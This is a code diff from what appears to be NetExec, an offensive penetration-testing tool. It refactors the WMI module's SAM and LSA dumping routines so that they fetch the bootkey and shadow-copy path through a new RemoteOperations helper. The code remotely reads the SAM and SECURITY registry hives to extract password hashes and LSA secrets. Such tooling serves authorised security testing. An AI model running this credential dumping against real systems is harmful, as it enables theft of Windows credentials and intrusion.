@@ -7,6 +7,7 @@ from nxc.config import process_secret
 from nxc.connection import connection, dcom_FirewallChecker, requires_admin
 from nxc.logger import NXCAdapter
 from nxc.protocols.wmi import wmiexec, wmiexec_event
+from nxc.protocols.wmi.remoteops import RemoteOperations
 
 from impacket import ntlm
 from impacket.uuid import uuidtup_to_bin
@@ -49,8 +50,8 @@ class wmi(connection):
         }
         self.iWbemLevel1Login = None
         self.dcom_conn = None
-
         self.namespaces = {}
+        self._remote_ops = None
 
         connection.__init__(self, args, db, host)
 
@@ -428,59 +429,20 @@ class wmi(connection):
     def sam(self):
         output_filename = self.output_file_template.format(output_folder="sam")
 
-        # Get the Namespace
-        cimv2_namespace = self.get_namespace("//./root/cimv2")
-        if cimv2_namespace is None:
-            self.logger.fail("Could not dump SAM")
-
-        # Creating Shadow Volumes
-        try:
-            win32_shadow_copy, _ = cimv2_namespace.GetObject("Win32_ShadowCopy")
-            self.logger.debug("Trying to create SS remotely via WMI")
-            result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
-            shadow_id = result.ShadowID
-            self.logger.debug(f"Shadow Copy created at ID {shadow_id}")
-        except Exception as e:
-            self.logger.fail("Cannot create ShadowCopy")
-            self.logger.debug(e)
+        bootkey = self.remote_ops.get_bootkey(output_filename)
+        if bootkey is None:
+            self.logger.fail("Could not get Bootkey")
             return
-
-        # Finding it on disk
-        iEnum_shadow_copies = cimv2_namespace.ExecQuery(f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{shadow_id}"')
-        obj = iEnum_shadow_copies.Next(0xffffffff, 1)[0]
-        props = obj.getProperties()
-        shadow_copy = {k: v["value"] for k, v in props.items()}
-        self.logger.debug(f"Found ShadowCopy at {shadow_copy['DeviceObject']}")
 
         # Get the SAM hive
-        sam_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SAM"
-        sam_hive_recovered = self.get_file_single(sam_hive_path, f"{output_filename}.sam")
-        if sam_hive_recovered:
-            self.logger.debug("Got SAM hive")
-
-        system_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SYSTEM"
-        system_hive_recovered = self.get_file_single(system_hive_path, f"{output_filename}.system")
-        if system_hive_recovered:
-            self.logger.debug("Got SYSTEM hive")
-
-        # Delete the ShadowCopy
-        wmiPath = f'Win32_ShadowCopy.ID="{shadow_id}"'
-        self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
-        ret = cimv2_namespace.DeleteInstance(wmiPath)
-        if (ret.GetCallStatus(0) & 0xffffffff) != 0:
-            self.logger.fail(f"Could not delete ShadowCopy ID {shadow_id}. You will need to delete this by yourself.")
-        else:
-            self.logger.debug(f"ShadowCopy with ID {shadow_id} successfully deleted")
-
-        if not (sam_hive_recovered and system_hive_recovered):
-            self.logger.fail("Could not get hives")
+        sam_hive_path = f"{self.remote_ops.shadow_copy_path}\\Windows\\System32\\config\\SAM"
+        if not self.get_file_single(sam_hive_path, f"{output_filename}.sam"):
+            self.logger.fail("Could not get SAM hive")
             return
 
-        local_operations = LocalOperations(f"{output_filename}.system")
-        boot_key = local_operations.getBootKey()
         SAM = SAMHashes(
                 f"{output_filename}.sam",
-                boot_key,
+                bootkey,
                 isRemote=None,
                 perSecretCallback=lambda secret: self.logger.highlight(secret),
             )
@@ -492,59 +454,20 @@ class wmi(connection):
     def lsa(self):
         output_filename = self.output_file_template.format(output_folder="lsa")
 
-        # Get the Namespace
-        cimv2_namespace = self.get_namespace("//./root/cimv2")
-        if cimv2_namespace is None:
-            self.logger.fail("Could not dump SAM")
-
-        # Creating Shadow Volumes
-        try:
-            win32_shadow_copy, _ = cimv2_namespace.GetObject("Win32_ShadowCopy")
-            self.logger.debug("Trying to create SS remotely via WMI")
-            result = win32_shadow_copy.Create("C:\\", "ClientAccessible")
-            shadow_id = result.ShadowID
-            self.logger.debug(f"Shadow Copy created at ID {shadow_id}")
-        except Exception as e:
-            self.logger.fail("Cannot create ShadowCopy")
-            self.logger.debug(e)
+        bootkey = self.remote_ops.get_bootkey(output_filename)
+        if bootkey is None:
+            self.logger.fail("Could not get Bootkey")
             return
 
-        # Finding it on disk
-        iEnum_shadow_copies = cimv2_namespace.ExecQuery(f'SELECT DeviceObject FROM Win32_ShadowCopy WHERE ID = "{shadow_id}"')
-        obj = iEnum_shadow_copies.Next(0xffffffff, 1)[0]
-        props = obj.getProperties()
-        shadow_copy = {k: v["value"] for k, v in props.items()}
-        self.logger.debug(f"Found ShadowCopy at {shadow_copy['DeviceObject']}")
-
-        # Get the SECURITY hive
-        security_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SECURITY"
-        security_hive_recovered = self.get_file_single(security_hive_path, f"{output_filename}.security")
-        if security_hive_recovered:
-            self.logger.debug("Got SECURITY hive")
-
-        system_hive_path = f"{shadow_copy['DeviceObject']}\\Windows\\System32\\config\\SYSTEM"
-        system_hive_recovered = self.get_file_single(system_hive_path, f"{output_filename}.system")
-        if system_hive_recovered:
-            self.logger.debug("Got SYSTEM hive")
-
-        # Delete the ShadowCopy
-        wmiPath = f'Win32_ShadowCopy.ID="{shadow_id}"'
-        self.logger.debug(f"Trying to delete ShadowCopy with ID {shadow_id}")
-        ret = cimv2_namespace.DeleteInstance(wmiPath)
-        if (ret.GetCallStatus(0) & 0xffffffff) != 0:
-            self.logger.fail(f"Could not delete ShadowCopy ID {shadow_id}. You will need to delete this by yourself.")
-        else:
-            self.logger.debug(f"ShadowCopy with ID {shadow_id} successfully deleted")
-
-        if not (security_hive_recovered and system_hive_recovered):
-            self.logger.fail("Could not get hives")
+        # Get the LSA hive
+        lsa_hive_path = f"{self.remote_ops.shadow_copy_path}\\Windows\\System32\\config\\SECURITY"
+        if not self.get_file_single(lsa_hive_path, f"{output_filename}.security"):
+            self.logger.fail("Could not get LSA hive")
             return
 
-        local_operations = LocalOperations(f"{output_filename}.system")
-        boot_key = local_operations.getBootKey()
         LSA = LSASecrets(
             f"{output_filename}.security",
-            boot_key,
+            bootkey,
             None,
             isRemote=None,
             perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
@@ -687,3 +610,9 @@ class wmi(connection):
             return None
         self.namespaces[namespace] = iWbemServices
         return self.namespaces[namespace]
+
+    @property
+    def remote_ops(self):
+        if self._remote_ops is None:
+            self._remote_ops = RemoteOperations(self)
+        return self._remote_ops
